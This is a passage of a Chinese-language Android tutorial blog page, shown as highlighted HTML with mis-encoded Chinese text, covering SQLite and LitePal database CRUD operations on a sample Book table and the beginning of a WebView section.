<span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>, <span class="string">&quot;BookStore.db&quot;</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ æ•°æ®"><strong>æ·»åŠ æ•°æ®</strong></h4><p>insertæ–¹æ³•ï¼Œä¸‰ä¸ªå‚æ•°</p><ul><li>å‚æ•°ä¸€ï¼šè¡¨å</li><li>å‚æ•°äºŒï¼šæœªæŒ‡å®šæ·»åŠ æ•°æ®çš„æƒ…å†µä¸‹ç»™æŸäº›å¯ä¸ºç©ºçš„åˆ—è‡ªåŠ¨èµ‹å€¼nullï¼Œä¸€èˆ¬ä¸ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œç›´æ¥ä¼ å…¥null</li><li>ContentValueså¯¹è±¡ï¼šæä¾›äº†putæ–¹æ³•ï¼Œç”¨äºæ·»åŠ æ•°æ®</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">                <span class="comment">// å¼€å§‹ç»„è£…ç¬¬ä¸€æ¡æ•°æ®</span></span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">454</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">16.96</span>);</span><br><span class="line">                db.insert(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, values); <span class="comment">// æ’å…¥ç¬¬ä¸€æ¡æ•°æ®</span></span><br><span class="line">                values.clear();</span><br><span class="line">                <span class="comment">// å¼€å§‹ç»„è£…ç¬¬äºŒæ¡æ•°æ®</span></span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;The Lost Symbol&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">510</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">19.95</span>);</span><br><span class="line">                db.insert(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, values); <span class="comment">// æ’å…¥ç¬¬äºŒæ¡æ•°æ®</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="æ›´æ–°æ•°æ®">æ›´æ–°æ•°æ®</h4><p>updateæ–¹æ³•ï¼Œå››ä¸ªå‚æ•°</p><ul><li>å‚æ•°ä¸€ï¼šè¡¨å</li><li>å‚æ•°äºŒï¼šContentValueså¯¹è±¡ï¼Œæ·»åŠ æ›´æ–°æ•°æ®</li><li>ä¸‰ï¼Œå››ä¸ªå‚æ•°ï¼šç”¨äºçº¦æŸæ›´æ–°æŸä¸€è¡Œæˆ–æŸå‡ è¡Œä¸­çš„æ•°æ®ï¼Œä¸æŒ‡å®šçš„è¯é»˜è®¤æ›´æ–°æ‰€æœ‰è¡Œ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">10.99</span>);</span><br><span class="line">                db.update(<span class="string">&quot;Book&quot;</span>, values, <span class="string">&quot;name = ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;The Da Vinci Code&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤æ•°æ®">åˆ é™¤æ•°æ®</h4><p>deleteæ–¹æ³•ï¼Œä¸‰ä¸ªå‚æ•°</p><ul><li>å‚æ•°ä¸€ï¼šè¡¨å</li><li>å‚æ•°äºŒï¼Œä¸‰ï¼šç”¨äºçº¦æŸåˆ é™¤æŸä¸€è¡Œæˆ–æŸå‡ è¡Œä¸­çš„æ•°æ®ï¼Œä¸æŒ‡å®šçš„è¯é»˜è®¤åˆ é™¤æ‰€æœ‰è¡Œ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                db.delete(<span class="string">&quot;Book&quot;</span>, <span class="string">&quot;pages &gt; ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;500&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥è¯¢æ•°æ®">æŸ¥è¯¢æ•°æ®</h4><p>queryï¼šä¸ƒä¸ªå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªCursorå¯¹è±¡ï¼Œæ•°æ®åœ¨å¯¹è±¡ä¸­</p><ul><li>å‚æ•°ä¸€ï¼šè¡¨å</li><li>å‚æ•°äºŒï¼šæŒ‡å®šæŸ¥è¯¢å“ªå‡ åˆ—ï¼Œä¸æŒ‡å®šåˆ™é»˜è®¤æ‰€æœ‰åˆ—</li><li>ç¬¬ä¸‰ å››ä¸ªå‚æ•°ï¼šçº¦æŸæŸ¥è¯¢æŸä¸€è¡Œæˆ–æŸå‡ è¡Œçš„æ•°æ®ï¼Œä¸çŸ¥é“é»˜è®¤æ‰€æœ‰è¡Œ</li><li>å‚æ•°äº”ï¼šæŒ‡å®šéœ€è¦å»group byçš„åˆ—ï¼Œä¸æŒ‡å®šåˆ™ä¸å¯¹æŸ¥è¯¢ç»“æœgroup by</li><li>å‚æ•°å…­ï¼šå¯¹group byåçš„æ•°æ®è¿›ä¸€æ­¥è¿‡æ»¤</li><li>å‚æ•°ä¸ƒï¼šæŒ‡å®šæŸ¥è¯¢ç»“æœçš„æ’åˆ—æ–¹å¼</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="comment">// æŸ¥è¯¢Bookè¡¨ä¸­æ‰€æœ‰çš„æ•°æ®</span></span><br><span class="line">                <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.query(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="comment">// éå†Cursorå¯¹è±¡ï¼Œå–å‡ºæ•°æ®å¹¶æ‰“å°</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">                        <span class="type">String</span> <span class="variable">author</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;author&quot;</span>));</span><br><span class="line">                        <span class="type">int</span> <span class="variable">pages</span> <span class="operator">=</span> cursor.getInt(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>));</span><br><span class="line">                        <span class="type">double</span> <span class="variable">price</span> <span class="operator">=</span> cursor.getDouble(cursor.getColumnIndex(<span class="string">&quot;price&quot;</span>));</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span> + name);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span> + author);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span> + pages);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span> + price);</span><br><span class="line">                    &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">                &#125;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨SQLæ“ä½œæ•°æ®åº“">ä½¿ç”¨SQLæ“ä½œæ•°æ®åº“</h4><ul><li><p>æ·»åŠ æ•°æ®</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.execSQL(&quot;<span class="keyword">insert</span> <span class="keyword">into</span> Book (name, author, pages, price) <span class="keyword">values</span>(?, ?, ?, ?)<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            new String[] &#123; &quot;</span>The Da Vinci Code<span class="string">&quot;, &quot;</span>Dan Brown<span class="string">&quot;, &quot;</span><span class="number">454</span><span class="string">&quot;, &quot;</span><span class="number">16.96</span><span class="string">&quot; &#125;);</span></span><br><span class="line"><span class="string">db.execSQL(&quot;</span><span class="keyword">insert</span> <span class="keyword">into</span> Book (name, author, pages, price) <span class="keyword">values</span>(?, ?, ?, ?)<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            new String[] &#123; &quot;</span>The Lost Symbol<span class="string">&quot;, &quot;</span>Dan Brown<span class="string">&quot;, &quot;</span><span class="number">510</span><span class="string">&quot;, &quot;</span><span class="number">19.95</span><span class="string">&quot; &#125;);</span></span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–°æ•°æ®</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="built_in">execSQL</span>(<span class="string">&quot;update Book set price = ? where name = ?&quot;</span>, <span class="keyword">new</span> <span class="type">String</span>[] &#123; <span class="string">&quot;10.99&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤æ•°æ®</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="built_in">execSQL</span>(<span class="string">&quot;delete from Book where pages &gt; ?&quot;</span>, <span class="keyword">new</span> <span class="type">String</span>[] &#123; <span class="string">&quot;500&quot;</span> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥è¯¢æ•°æ®</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.rawQuery<span class="punctuation">(</span><span class="string">&quot;select * from Book&quot;</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="LitePalæ“ä½œæ•°æ®åº“">LitePalæ“ä½œæ•°æ®åº“</h3><h4 id="é…ç½®LitePal">é…ç½®LitePal</h4><ol><li><strong>æ·»åŠ LitePalä¾èµ–</strong></li></ol><p>ç¼–è¾‘<code>app/build.gradle</code>æ–‡ä»¶ï¼Œåœ¨dependenciesé—­åŒ…ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    <span class="keyword">compile</span> <span class="keyword">fileTree</span>(dir: <span class="string">&#x27;libs&#x27;</span>, <span class="keyword">include</span>: [<span class="string">&#x27;*.jar&#x27;</span>])</span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;com.android.support:appcompat-v7:23.2.0&#x27;</span></span><br><span class="line">    testCompile <span class="string">&#x27;junit:junit:4.12&#x27;</span></span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;org.litepal.android:core:1.4.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.é…ç½®litepal.xmlæ–‡ä»¶</strong></p><p>å³å‡»<code>app/src/main</code>ç›®å½•â†’<code>New</code>â†’<code>Directory</code>ï¼Œåˆ›å»ºä¸€ä¸ª<code>assets</code>ç›®å½•ï¼Œç„¶ååœ¨assetsç›®å½•ä¸‹å†æ–°å»ºä¸€ä¸ªlitepal.xmlæ–‡ä»¶ï¼Œæ¥ç€ç¼–è¾‘litepal.xmlæ–‡ä»¶ä¸­çš„å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">&quot;BookStore&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;dbname&gt;</code>æ ‡ç­¾ç”¨äºæŒ‡å®šæ•°æ®åº“å</li><li><code>&lt;version&gt;</code> æ ‡ç­¾ç”¨äºæŒ‡å®šæ•°æ®åº“ç‰ˆæœ¬å·</li><li><code>&lt;list&gt;</code>æ ‡ç­¾ç”¨äºæŒ‡å®šæ‰€æœ‰çš„æ˜ å°„æ¨¡å‹</li></ul><p><strong>3.é…ç½®LitePalApplication</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.example.litepaltest&quot;</span>&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        android:name=<span class="string">&quot;org.litepal.LitePalApplication&quot;</span></span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;<span class="variable">@mipmap</span>/ic_launcher&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;<span class="variable">@string</span>/app_name&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:theme=<span class="string">&quot;<span class="variable">@style</span>/AppTheme&quot;</span>&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;<span class="regexp">/application&gt;</span></span><br><span class="line"><span class="regexp">&lt;/mani</span>fest&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†é¡¹ç›®çš„<code>application</code>é…ç½®ä¸º<code>org.litepal.LitePalApplication</code>ï¼Œè¿™æ ·æ‰èƒ½è®©LitePalçš„æ‰€æœ‰åŠŸèƒ½éƒ½å¯ä»¥æ­£å¸¸å·¥ä½œ</p><h4 id="åˆ›å»ºå’Œå‡çº§æ•°æ®åº“">åˆ›å»ºå’Œå‡çº§æ•°æ®åº“</h4><p>åˆ›å»ºBookç±»ï¼Œå®šä¹‰å¥½ç›¸å…³å±æ€§ï¼ˆè¡¨çš„åˆ—åï¼‰</p><p>åœ¨<code>litepal.xml</code>çš„<code>&lt;list&gt;</code>æ ‡ç­¾å†…æ·»åŠ <code>&lt;mapping class=&quot;com.example.litepaltest.Book&quot;&gt;&lt;/mapping&gt;</code></p><p><mapping>æ ‡ç­¾ï¼šå£°æ˜é…ç½®çš„æ˜ å°„æ¨¡å‹ç±»ï¼Œä½¿ç”¨å®Œæ•´ç±»åï¼Œæœ‰å¤šå°‘ä¸ªæ˜ å°„æ¨¡å‹ç±»ï¼Œå°±æœ‰å¤šå°‘ä¸ª&lt;mapping æ ‡ç­¾</mapping></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> <span class="keyword">extends</span> <span class="title class_">DataSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰å±æ€§ï¼Œå³åˆ—å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainActivityä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                </span><br><span class="line">                Connector.getDatabase();</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>Connector.getDatabase();ï¼šåˆ›å»ºæ•°æ®åº“</p><h4 id="æ·»åŠ æ•°æ®-2">æ·»åŠ æ•°æ®</h4><p>LitePalè¿›è¡Œè¡¨ç®¡ç†æ“ä½œæ—¶ä¸éœ€è¦æ¨¡å‹ç±»æœ‰ä»»ä½•çš„ç»§æ‰¿ç»“æ„ï¼Œä½†æ˜¯è¿›è¡ŒCRUDæ“ä½œæ—¶å°±ä¸è¡Œäº†ï¼Œå¿…é¡»è¦è®© ç›¸å…³è¡¨ç±» ç»§æ‰¿è‡ªDataSupport ç±»æ‰è¡Œï¼Œå¦‚Bookè¡¨éœ€è¦è®©Bookç±»ç»§æ‰¿<code>DataSupport</code>ç±»ï¼Œç„¶åè°ƒç”¨<code>.save()</code>æ–¹æ³•å°†æ•°æ®å­˜å…¥æ•°æ®åº“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">                book.setName(<span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                book.setAuthor(<span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                book.setPages(<span class="number">454</span>);</span><br><span class="line">                book.setPrice(<span class="number">16.96</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Unknow&quot;</span>);</span><br><span class="line">                book.save();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="æ›´æ–°æ•°æ®-2">æ›´æ–°æ•°æ®</h4><p>å¯¹äºLitePalæ¥è¯´ï¼Œå¯¹è±¡æ˜¯å¦å·²å­˜å‚¨å°±æ˜¯æ ¹æ®è°ƒç”¨model.isSaved() æ–¹æ³•çš„ç»“æœæ¥åˆ¤æ–­çš„ï¼Œè¿”å›true å°±è¡¨ç¤ºå·²å­˜å‚¨ï¼Œè¿”å›false å°±è¡¨ç¤ºæœªå­˜å‚¨ã€‚</p><p>æ–¹æ³•ä¸€ï¼šå¯¹å·²å­˜å‚¨çš„å¯¹è±¡ï¼Œé‡æ–°è°ƒç”¨<code>.save()</code>æ–¹æ³•è¿›è¡Œæ›´æ–°</p><p>æ–¹æ³•äºŒï¼šæ›´æ–°ä»æ•°æ®åº“ä¸­æŸ¥åˆ°çš„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">                book.setPrice(<span class="number">14.95</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Anchor&quot;</span>);</span><br><span class="line">                book.updateAll(<span class="string">&quot;name = ? and author = ?&quot;</span>, <span class="string">&quot;The Lost Symbol&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>æƒ³æŠŠä¸€ä¸ªå­—æ®µçš„å€¼æ›´æ–°æˆé»˜è®¤å€¼æ—¶ï¼Œæ˜¯ä¸å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„æ–¹å¼æ¥set æ•°æ®çš„ã€‚å°†ä¸ºæ•°æ®æ›´æ–°æˆé»˜è®¤å€¼çš„æ“ä½œï¼ŒLitePalç»Ÿä¸€æä¾›äº†ä¸€ä¸ªsetToDefault() æ–¹æ³•ï¼Œç„¶åä¼ å…¥ç›¸åº”çš„åˆ—åå°±å¯ä»¥å®ç°äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">book.setToDefault(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤æ•°æ®-2">åˆ é™¤æ•°æ®</h4><ul><li><p>æ–¹æ³•ä¸€</p><p>è°ƒç”¨è¿‡save() æ–¹æ³•çš„å¯¹è±¡ï¼Œæˆ–è€…æ˜¯é€šè¿‡LitePalæä¾›çš„æŸ¥è¯¢APIæŸ¥å‡ºæ¥çš„å¯¹è±¡ï¼Œéƒ½æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨delete() æ–¹æ³•æ¥åˆ é™¤æ•°æ®çš„ã€‚</p></li><li><p>æ–¹æ³•äºŒ</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataSupport.deleteAll(Book.class, <span class="string">&quot;price &lt; ?&quot;</span>, <span class="string">&quot;15&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨äº†DataSupport.deleteAll() æ–¹æ³•æ¥åˆ é™¤æ•°æ®ï¼Œå…¶ä¸­deleteAll() æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºæŒ‡å®šåˆ é™¤å“ªå¼ è¡¨ä¸­çš„æ•°æ®ï¼ŒBook.classå°±æ„å‘³ç€åˆ é™¤Bookè¡¨ä¸­çš„æ•°æ®ï¼Œåé¢çš„å‚æ•°ç”¨äºæŒ‡å®šçº¦æŸæ¡ä»¶ã€‚</p><h4 id="æŸ¥è¯¢æ•°æ®-2">æŸ¥è¯¢æ•°æ®</h4><p>findAllï¼šè¿”å›Bookå¯¹è±¡ç±»å‹çš„Listé›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                List&lt;Book&gt; books = DataSupport.findAll(Book.class);</span><br><span class="line">                <span class="keyword">for</span> (Book book: books) &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span> + book.getName());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span> + book.getAuthor());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span> + book.getPages());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span> + book.getPrice());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book press is &quot;</span> + book.getPress());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h2 id="WebView">WebView</h2><h3 id="åŸºæœ¬ä½¿ç”¨">åŸºæœ¬ä½¿ç”¨</h3><p><strong>æœ¬åœ°åŠ è½½</strong></p><p>å¸ƒå±€æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;WebView</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/web_view&quot;</span></span><br><span class="line">        android:<span 